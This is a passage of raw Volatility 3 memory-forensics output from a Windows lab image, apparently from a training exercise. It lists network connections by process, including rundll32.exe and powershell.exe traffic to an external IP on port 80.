0x800ae1b6c050  TCPv4   192.168.152.134 52797   142.250.186.195 443     ESTABLISHED     2784    chrome.exe      2023-08-10 09:33:33.000000
0x800ae21ae320  TCPv4   192.168.152.134 49712   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae0e914b0  TCPv4   192.168.152.134 52810   44.214.212.249  80      LAST_ACK        3648    rundll32.exe    2023-08-10 09:33:36.000000
0x800ae21ac1e0  TCPv4   192.168.152.134 52834   142.250.203.202 443     ESTABLISHED     2784    chrome.exe      2023-08-10 09:33:45.000000
0x800adbec6a20  TCPv4   192.168.152.134 49855   192.229.221.95  80      CLOSE_WAIT      6908    SkypeApp.exe    2023-08-10 09:10:29.000000
0x800ae17a8b60  TCPv4   192.168.152.134 53111   140.82.121.3    443     ESTABLISHED     7820    Velociraptor.e  2023-08-10 09:35:39.000000
0x800ae25dba20  TCPv4   192.168.152.134 49709   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800adf4e3010  TCPv4   192.168.152.134 53114   185.199.109.133 443     ESTABLISHED     7820    Velociraptor.e  2023-08-10 09:35:39.000000
0x800ae07f0260  TCPv4   192.168.152.134 52686   142.250.203.202 443     ESTABLISHED     2784    chrome.exe      2023-08-10 09:32:47.000000
0x800ae1387740  TCPv4   192.168.152.134 49710   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae113e010  TCPv4   192.168.152.134 53118   44.214.212.249  80      ESTABLISHED     3648    rundll32.exe    2023-08-10 09:35:41.000000
0x800ae2d1eb60  TCPv4   192.168.152.134 49856   104.81.60.16    80      CLOSE_WAIT      6908    SkypeApp.exe    2023-08-10 09:10:32.000000
0x800ae016d8a0  TCPv4   192.168.152.134 49852   40.115.3.253    443     ESTABLISHED     440     svchost.exe     2023-08-10 09:10:26.000000
0x800ae16df010  TCPv4   192.168.152.134 49714   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae1121940  TCPv4   192.168.152.134 49862   192.168.152.133 8000    ESTABLISHED     7820    Velociraptor.e  2023-08-10 09:11:16.000000
0x800ae13e6a70  TCPv4   192.168.152.134 49876   40.115.3.253    443     ESTABLISHED     440     svchost.exe     2023-08-10 09:11:22.000000
0x800ae1319b60  TCPv4   192.168.152.134 52814   34.104.35.123   80      ESTABLISHED     440     svchost.exe     2023-08-10 09:33:37.000000
0x800ae26a5050  TCPv4   192.168.152.134 52683   142.250.203.202 443     ESTABLISHED     2784    chrome.exe      2023-08-10 09:32:47.000000
0x800ade79a630  TCPv4   192.168.152.134 49713   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae1350a40  TCPv4   192.168.152.134 49711   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae134f730  TCPv4   192.168.152.134 49705   192.229.221.95  80      CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800adeb254f0  TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       884     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb254f0  TCPv6   ::      135     ::      0       LISTENING       884     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb24310  TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       884     svchost.exe     2023-08-10 00:22:56.000000
0x800ae0b8c310  TCPv4   192.168.152.134 139     0.0.0.0 0       LISTENING       4       System  2023-08-10 09:10:18.000000
0x800adb8979f0  TCPv4   0.0.0.0 445     0.0.0.0 0       LISTENING       4       System  2023-08-10 00:22:58.000000
0x800adb8979f0  TCPv6   ::      445     ::      0       LISTENING       4       System  2023-08-10 00:22:58.000000
0x800ae07fb9f0  TCPv4   0.0.0.0 5040    0.0.0.0 0       LISTENING       1172    svchost.exe     2023-08-10 00:23:01.000000
0x800ae15a39f0  TCPv4   0.0.0.0 5357    0.0.0.0 0       LISTENING       4       System  2023-08-10 00:23:14.000000
0x800ae15a39f0  TCPv6   ::      5357    ::      0       LISTENING       4       System  2023-08-10 00:23:14.000000
0x800adeb24cb0  TCPv4   0.0.0.0 49664   0.0.0.0 0       LISTENING       660     lsass.exe       2023-08-10 00:22:56.000000
0x800adeb24cb0  TCPv6   ::      49664   ::      0       LISTENING       660     lsass.exe       2023-08-10 00:22:56.000000
0x800adeb24730  TCPv4   0.0.0.0 49664   0.0.0.0 0       LISTENING       660     lsass.exe       2023-08-10 00:22:56.000000
0x800adeb24470  TCPv4   0.0.0.0 49665   0.0.0.0 0       LISTENING       492     wininit.exe     2023-08-10 00:22:56.000000
0x800adeb24470  TCPv6   ::      49665   ::      0       LISTENING       492     wininit.exe     2023-08-10 00:22:56.000000
0x800adbed9bd0  TCPv4   0.0.0.0 49665   0.0.0.0 0       LISTENING       492     wininit.exe     2023-08-10 00:22:56.000000
0x800adeb24050  TCPv4   0.0.0.0 49666   0.0.0.0 0       LISTENING       360     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb24050  TCPv6   ::      49666   ::      0       LISTENING       360     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb24890  TCPv4   0.0.0.0 49666   0.0.0.0 0       LISTENING       360     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb257b0  TCPv4   0.0.0.0 49667   0.0.0.0 0       LISTENING       440     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb257b0  TCPv6   ::      49667   ::      0       LISTENING       440     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb25650  TCPv4   0.0.0.0 49667   0.0.0.0 0       LISTENING       440     svchost.exe     2023-08-10 00:22:56.000000
0x800adb897310  TCPv4   0.0.0.0 49668   0.0.0.0 0       LISTENING       1788    spoolsv.exe     2023-08-10 00:22:57.000000
0x800adb897310  TCPv6   ::      49668   ::      0       LISTENING       1788    spoolsv.exe     2023-08-10 00:22:57.000000
0x800adb8971b0  TCPv4   0.0.0.0 49668   0.0.0.0 0       LISTENING       1788    spoolsv.exe     2023-08-10 00:22:57.000000
0x800adb8975d0  TCPv4   0.0.0.0 49669   0.0.0.0 0       LISTENING       632     services.exe    2023-08-10 00:22:58.000000
0x800adb8975d0  TCPv6   ::      49669   ::      0       LISTENING       632     services.exe    2023-08-10 00:22:58.000000
0x800adb897e10  TCPv4   0.0.0.0 49669   0.0.0.0 0       LISTENING       632     services.exe    2023-08-10 00:22:58.000000
0x800ae0b8d7b0  TCPv4   0.0.0.0 49731   0.0.0.0 0       LISTENING       8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae0b8d7b0  TCPv6   ::      49731   ::      0       LISTENING       8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae0b8ccb0  TCPv4   0.0.0.0 49731   0.0.0.0 0       LISTENING       8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae2203a70  UDPv4   192.168.152.134 137     *       0               4       System  2023-08-10 09:10:18.000000
0x800ae22043d0  UDPv4   192.168.152.134 138     *       0               4       System  2023-08-10 09:10:18.000000
0x800ae1a0b900  UDPv4   0.0.0.0 500     *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1a0b900  UDPv6   ::      500     *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1f17480  UDPv4   0.0.0.0 500     *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1a16990  UDPv6   fe80::98f6:8cdd:2543:684b       1900    *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a17480  UDPv6   ::1     1900    *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a172f0  UDPv4   192.168.152.134 1900    *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a18d80  UDPv4   127.0.0.1       1900    *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a0fc30  UDPv4   0.0.0.0 3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a0fc30  UDPv6   ::      3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a10590  UDPv4   0.0.0.0 3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a10590  UDPv6   ::      3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae2202300  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2202300  UDPv6   ::      3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2204560  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2204560  UDPv6   ::      3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae1a10270  UDPv4   0.0.0.0 3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a0faa0  UDPv4   0.0.0.0 3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae2203430  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2205050  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae1a0e7e0  UDPv4   0.0.0.0 4500    *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1a0e7e0  UDPv6   ::      4500    *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1f3c4b0  UDPv4   0.0.0.0 4500    *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae0a77c30  UDPv4   0.0.0.0 5050    *       0               1172    svchost.exe     2023-08-10 00:23:00.000000
0x800ae2202940  UDPv4   0.0.0.0 5353    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae2202940  UDPv6   ::      5353    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae22032a0  UDPv4   0.0.0.0 5353    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae0e38ca0  UDPv4   0.0.0.0 5353    *       0               892     chrome.exe      2023-08-10 09:32:37.000000
0x800ae0e37b70  UDPv4   0.0.0.0 5353    *       0               892     chrome.exe      2023-08-10 09:32:37.000000
0x800ae0e37b70  UDPv6   ::      5353    *       0               892     chrome.exe      2023-08-10 09:32:37.000000
0x800ae1f032a0  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 09:25:16.000000
0x800ae1f032a0  UDPv6   ::      5355    *       0               1272    svchost.exe     2023-08-10 09:25:16.000000
0x800ae1f03a70  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 09:25:16.000000
0x800ae1a108b0  UDPv4   0.0.0.0 49562   *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a113a0  UDPv4   0.0.0.0 49563   *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a113a0  UDPv6   ::      49563   *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae0e373a0  UDPv4   0.0.0.0 55185   *       0               2784    chrome.exe      2023-08-10 09:33:49.000000
0x800ae05c4280  UDPv4   127.0.0.1       62675   *       0               440     svchost.exe     2023-08-10 00:22:58.000000
0x800ae2204880  UDPv4   0.0.0.0 63077   *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae22038e0  UDPv4   0.0.0.0 63078   *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae22038e0  UDPv6   ::      63078   *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae1a15860  UDPv6   fe80::98f6:8cdd:2543:684b       63379   *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a16800  UDPv6   ::1     63380   *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a15b80  UDPv4   192.168.152.134 63381   *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a164e0  UDPv4   127.0.0.1       63382   *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1f02c60  UDPv4   0.0.0.0 65457   *       0               6908    SkypeApp.exe    2023-08-10 09:10:31.000000
0x800ae1f02c60  UDPv6   ::      65457   *       0               6908    SkypeApp.exe    2023-08-10 09:10:31.000000
```

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.netscan
Volatility 3 Framework 2.5.0

Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

0x800adb8971b0  TCPv4   0.0.0.0 49668   0.0.0.0 0       LISTENING       1788    spoolsv.exe     2023-08-10 00:22:57.000000
0x800adb897310  TCPv4   0.0.0.0 49668   0.0.0.0 0       LISTENING       1788    spoolsv.exe     2023-08-10 00:22:57.000000
0x800adb897310  TCPv6   ::      49668   ::      0       LISTENING       1788    spoolsv.exe     2023-08-10 00:22:57.000000
0x800adb8975d0  TCPv4   0.0.0.0 49669   0.0.0.0 0       LISTENING       632     services.exe    2023-08-10 00:22:58.000000
0x800adb8975d0  TCPv6   ::      49669   ::      0       LISTENING       632     services.exe    2023-08-10 00:22:58.000000
0x800adb8979f0  TCPv4   0.0.0.0 445     0.0.0.0 0       LISTENING       4       System  2023-08-10 00:22:58.000000
0x800adb8979f0  TCPv6   ::      445     ::      0       LISTENING       4       System  2023-08-10 00:22:58.000000
0x800adb897e10  TCPv4   0.0.0.0 49669   0.0.0.0 0       LISTENING       632     services.exe    2023-08-10 00:22:58.000000
0x800adbec6a20  TCPv4   192.168.152.134 49855   192.229.221.95  80      CLOSE_WAIT      6908    SkypeApp.exe    2023-08-10 09:10:29.000000
0x800adbed9bd0  TCPv4   0.0.0.0 49665   0.0.0.0 0       LISTENING       492     wininit.exe     2023-08-10 00:22:56.000000
0x800ade6fe010  TCPv4   192.168.152.134 49702   13.107.6.156    443     CLOSED  2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ade79a630  TCPv4   192.168.152.134 49713   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800adeb24050  TCPv4   0.0.0.0 49666   0.0.0.0 0       LISTENING       360     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb24050  TCPv6   ::      49666   ::      0       LISTENING       360     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb24310  TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       884     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb24470  TCPv4   0.0.0.0 49665   0.0.0.0 0       LISTENING       492     wininit.exe     2023-08-10 00:22:56.000000
0x800adeb24470  TCPv6   ::      49665   ::      0       LISTENING       492     wininit.exe     2023-08-10 00:22:56.000000
0x800adeb24730  TCPv4   0.0.0.0 49664   0.0.0.0 0       LISTENING       660     lsass.exe       2023-08-10 00:22:56.000000
0x800adeb24890  TCPv4   0.0.0.0 49666   0.0.0.0 0       LISTENING       360     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb24cb0  TCPv4   0.0.0.0 49664   0.0.0.0 0       LISTENING       660     lsass.exe       2023-08-10 00:22:56.000000
0x800adeb24cb0  TCPv6   ::      49664   ::      0       LISTENING       660     lsass.exe       2023-08-10 00:22:56.000000
0x800adeb254f0  TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       884     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb254f0  TCPv6   ::      135     ::      0       LISTENING       884     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb25650  TCPv4   0.0.0.0 49667   0.0.0.0 0       LISTENING       440     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb257b0  TCPv4   0.0.0.0 49667   0.0.0.0 0       LISTENING       440     svchost.exe     2023-08-10 00:22:56.000000
0x800adeb257b0  TCPv6   ::      49667   ::      0       LISTENING       440     svchost.exe     2023-08-10 00:22:56.000000
0x800adf4e3010  TCPv4   192.168.152.134 53114   185.199.109.133 443     ESTABLISHED     7820    Velociraptor.e  2023-08-10 09:35:39.000000
0x800ae00c8c30  UDPv4   0.0.0.0 0       *       0               6744    powershell.exe  2023-08-10 09:21:20.000000
0x800ae016d8a0  TCPv4   192.168.152.134 49852   40.115.3.253    443     ESTABLISHED     440     svchost.exe     2023-08-10 09:10:26.000000
0x800ae01d3d20  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:30:31.000000
0x800ae01d6110  UDPv4   192.168.152.134 137     *       0               4       System  2023-08-10 00:22:56.000000
0x800ae01d6430  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:30:31.000000
0x800ae01d6430  UDPv6   ::      0       *       0               -       -       2023-08-10 00:30:31.000000
0x800ae01d7a10  UDPv4   192.168.152.134 138     *       0               4       System  2023-08-10 00:22:56.000000
0x800ae02cb0a0  UDPv4   0.0.0.0 5353    *       0               1272    svchost.exe     2023-08-10 00:22:56.000000
0x800ae02cb0a0  UDPv6   ::      5353    *       0               1272    svchost.exe     2023-08-10 00:22:56.000000
0x800ae02cb550  UDPv4   0.0.0.0 0       *       0               1272    svchost.exe     2023-08-10 00:22:56.000000
0x800ae02cb550  UDPv6   ::      0       *       0               1272    svchost.exe     2023-08-10 00:22:56.000000
0x800ae02cb870  UDPv4   0.0.0.0 5353    *       0               1272    svchost.exe     2023-08-10 00:22:56.000000
0x800ae02cbb90  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 00:22:56.000000
0x800ae02cbb90  UDPv6   ::      5355    *       0               1272    svchost.exe     2023-08-10 00:22:56.000000
0x800ae02cbd20  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 00:22:56.000000
0x800ae05c13a0  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:32:20.000000
0x800ae05c13a0  UDPv6   ::      0       *       0               -       -       2023-08-10 00:32:20.000000
0x800ae05c4280  UDPv4   127.0.0.1       62675   *       0               440     svchost.exe     2023-08-10 00:22:58.000000
0x800ae07f0260  TCPv4   192.168.152.134 52686   142.250.203.202 443     ESTABLISHED     2784    chrome.exe      2023-08-10 09:32:47.000000
0x800ae07fb9f0  TCPv4   0.0.0.0 5040    0.0.0.0 0       LISTENING       1172    svchost.exe     2023-08-10 00:23:01.000000
0x800ae0a77c30  UDPv4   0.0.0.0 5050    *       0               1172    svchost.exe     2023-08-10 00:23:00.000000
0x800ae0b8c310  TCPv4   192.168.152.134 139     0.0.0.0 0       LISTENING       4       System  2023-08-10 09:10:18.000000
0x800ae0b8ccb0  TCPv4   0.0.0.0 49731   0.0.0.0 0       LISTENING       8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae0b8d7b0  TCPv4   0.0.0.0 49731   0.0.0.0 0       LISTENING       8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae0b8d7b0  TCPv6   ::      49731   ::      0       LISTENING       8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae0bf6a40  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:30:31.000000
0x800ae0c53010  TCPv4   192.168.152.134 53116   44.214.212.249  80      CLOSED  6744    powershell.exe  2023-08-10 09:35:41.000000
0x800ae0e360e0  UDPv4   0.0.0.0 0       *       0               7820    Velociraptor.e  2023-08-10 09:35:20.000000
0x800ae0e360e0  UDPv6   ::      0       *       0               7820    Velociraptor.e  2023-08-10 09:35:20.000000
0x800ae0e36720  UDPv4   0.0.0.0 55396   *       0               1272    svchost.exe     2023-08-10 09:35:39.000000
0x800ae0e36720  UDPv6   ::      55396   *       0               1272    svchost.exe     2023-08-10 09:35:39.000000
0x800ae0e36d60  UDPv4   0.0.0.0 0       *       0               7820    Velociraptor.e  2023-08-10 09:35:20.000000
0x800ae0e36d60  UDPv6   ::      0       *       0               7820    Velociraptor.e  2023-08-10 09:35:20.000000
0x800ae0e373a0  UDPv4   0.0.0.0 55185   *       0               2784    chrome.exe      2023-08-10 09:33:49.000000
0x800ae0e37b70  UDPv4   0.0.0.0 5353    *       0               892     chrome.exe      2023-08-10 09:32:37.000000
0x800ae0e37b70  UDPv6   ::      5353    *       0               892     chrome.exe      2023-08-10 09:32:37.000000
0x800ae0e384d0  UDPv4   0.0.0.0 50396   *       0               1272    svchost.exe     2023-08-10 09:35:16.000000
0x800ae0e384d0  UDPv6   ::      50396   *       0               1272    svchost.exe     2023-08-10 09:35:16.000000
0x800ae0e38b10  UDPv4   0.0.0.0 0       *       0               440     svchost.exe     2023-08-10 09:35:16.000000
0x800ae0e38b10  UDPv6   ::      0       *       0               440     svchost.exe     2023-08-10 09:35:16.000000
0x800ae0e38ca0  UDPv4   0.0.0.0 5353    *       0               892     chrome.exe      2023-08-10 09:32:37.000000
0x800ae0e44050  UDPv4   0.0.0.0 0       *       0               3648    rundll32.exe    2023-08-10 00:32:02.000000
0x800ae0e44370  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 00:32:05.000000
0x800ae0e44820  UDPv4   0.0.0.0 55476   *       0               1272    svchost.exe     2023-08-10 00:32:05.000000
0x800ae0e44820  UDPv6   ::      55476   *       0               1272    svchost.exe     2023-08-10 00:32:05.000000
0x800ae0e44b40  UDPv4   0.0.0.0 0       *       0               3648    rundll32.exe    2023-08-10 00:32:02.000000
0x800ae0e44b40  UDPv6   ::      0       *       0               3648    rundll32.exe    2023-08-10 00:32:02.000000
0x800ae0e914b0  TCPv4   192.168.152.134 52810   44.214.212.249  80      LAST_ACK        3648    rundll32.exe    2023-08-10 09:33:36.000000
0x800ae0f50950  UDPv4   0.0.0.0 0       *       0               1172    svchost.exe     2023-08-10 00:32:14.000000
0x800ae0f50950  UDPv6   ::      0       *       0               1172    svchost.exe     2023-08-10 00:32:14.000000
0x800ae0f89520  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 00:31:56.000000
0x800ae1121940  TCPv4   192.168.152.134 49862   192.168.152.133 8000    ESTABLISHED     7820    Velociraptor.e  2023-08-10 09:11:16.000000
0x800ae113e010  TCPv4   192.168.152.134 53118   44.214.212.249  80      ESTABLISHED     3648    rundll32.exe    2023-08-10 09:35:41.000000
0x800ae12b5a20  TCPv4   192.168.152.134 49853   52.123.245.168  443     CLOSED  6908    SkypeApp.exe    2023-08-10 09:10:29.000000
0x800ae1319b60  TCPv4   192.168.152.134 52814   34.104.35.123   80      ESTABLISHED     440     svchost.exe     2023-08-10 09:33:37.000000
0x800ae134f730  TCPv4   192.168.152.134 49705   192.229.221.95  80      CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae1350a40  TCPv4   192.168.152.134 49711   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae1387740  TCPv4   192.168.152.134 49710   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae13a98a0  TCPv4   192.168.152.134 53115   44.214.212.249  80      CLOSED  5468    rundll32.exe    2023-08-10 09:35:40.000000
0x800ae13ab050  TCPv4   192.168.152.134 49858   52.168.112.66   443     CLOSED  6908    SkypeApp.exe    2023-08-10 09:10:47.000000
0x800ae13e6a70  TCPv4   192.168.152.134 49876   40.115.3.253    443     ESTABLISHED     440     svchost.exe     2023-08-10 09:11:22.000000
0x800ae15a39f0  TCPv4   0.0.0.0 5357    0.0.0.0 0       LISTENING       4       System  2023-08-10 00:23:14.000000
0x800ae15a39f0  TCPv6   ::      5357    ::      0       LISTENING       4       System  2023-08-10 00:23:14.000000
0x800ae16331d0  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:30:31.000000
0x800ae16331d0  UDPv6   ::      0       *       0               -       -       2023-08-10 00:30:31.000000
0x800ae16df010  TCPv4   192.168.152.134 49714   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae17a8b60  TCPv4   192.168.152.134 53111   140.82.121.3    443     ESTABLISHED     7820    Velociraptor.e  2023-08-10 09:35:39.000000
0x800ae1a0b900  UDPv4   0.0.0.0 500     *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1a0b900  UDPv6   ::      500     *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1a0e7e0  UDPv4   0.0.0.0 4500    *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1a0e7e0  UDPv6   ::      4500    *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1a0faa0  UDPv4   0.0.0.0 3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a0fc30  UDPv4   0.0.0.0 3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a0fc30  UDPv6   ::      3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a10270  UDPv4   0.0.0.0 3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a10590  UDPv4   0.0.0.0 3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a10590  UDPv6   ::      3702    *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a108b0  UDPv4   0.0.0.0 49562   *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a113a0  UDPv4   0.0.0.0 49563   *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a113a0  UDPv6   ::      49563   *       0               1996    svchost.exe     2023-08-10 00:23:14.000000
0x800ae1a15860  UDPv6   fe80::98f6:8cdd:2543:684b       63379   *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a15b80  UDPv4   192.168.152.134 63381   *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a164e0  UDPv4   127.0.0.1       63382   *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a16800  UDPv6   ::1     63380   *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a16990  UDPv6   fe80::98f6:8cdd:2543:684b       1900    *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a172f0  UDPv4   192.168.152.134 1900    *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a17480  UDPv6   ::1     1900    *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a18d80  UDPv4   127.0.0.1       1900    *       0               1996    svchost.exe     2023-08-10 00:23:15.000000
0x800ae1a25260  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:31:09.000000
0x800ae1a25260  UDPv6   ::      0       *       0               -       -       2023-08-10 00:31:09.000000
0x800ae1a26840  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:31:09.000000
0x800ae1a29bd0  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:31:10.000000
0x800ae1a2a3a0  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:31:10.000000
0x800ae1a2a3a0  UDPv6   ::      0       *       0               -       -       2023-08-10 00:31:10.000000
0x800ae1b6c050  TCPv4   192.168.152.134 52797   142.250.186.195 443     ESTABLISHED     2784    chrome.exe      2023-08-10 09:33:33.000000
0x800ae1cebdf0  UDPv4   0.0.0.0 0       *       0               8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae1cebdf0  UDPv6   ::      0       *       0               8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae1f02300  UDPv4   0.0.0.0 56456   *       0               1272    svchost.exe     2023-08-10 09:32:33.000000
0x800ae1f02300  UDPv6   ::      56456   *       0               1272    svchost.exe     2023-08-10 09:32:33.000000
0x800ae1f02ad0  UDPv4   0.0.0.0 55383   *       0               2784    chrome.exe      2023-08-10 09:32:34.000000
0x800ae1f02c60  UDPv4   0.0.0.0 65457   *       0               6908    SkypeApp.exe    2023-08-10 09:10:31.000000
0x800ae1f02c60  UDPv6   ::      65457   *       0               6908    SkypeApp.exe    2023-08-10 09:10:31.000000
0x800ae1f032a0  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 09:25:16.000000
0x800ae1f032a0  UDPv6   ::      5355    *       0               1272    svchost.exe     2023-08-10 09:25:16.000000
0x800ae1f035c0  UDPv4   192.168.152.134 63643   *       0               892     chrome.exe      2023-08-10 09:32:33.000000
0x800ae1f03a70  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 09:25:16.000000
0x800ae1f040b0  UDPv4   0.0.0.0 55432   *       0               2784    chrome.exe      2023-08-10 09:32:34.000000
0x800ae1f043d0  UDPv4   0.0.0.0 57346   *       0               2784    chrome.exe      2023-08-10 09:32:34.000000
0x800ae1f04d30  UDPv4   0.0.0.0 55121   *       0               2784    chrome.exe      2023-08-10 09:32:34.000000
0x800ae1f051e0  UDPv4   0.0.0.0 56220   *       0               2784    chrome.exe      2023-08-10 09:32:34.000000
0x800ae1f156d0  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
0x800ae1f17480  UDPv4   0.0.0.0 500     *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1f17de0  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
0x800ae1f19230  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
0x800ae1f19230  UDPv6   ::      3702    *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
0x800ae1f193c0  UDPv4   0.0.0.0 64514   *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
0x800ae1f19a00  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
0x800ae1f19a00  UDPv6   ::      3702    *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
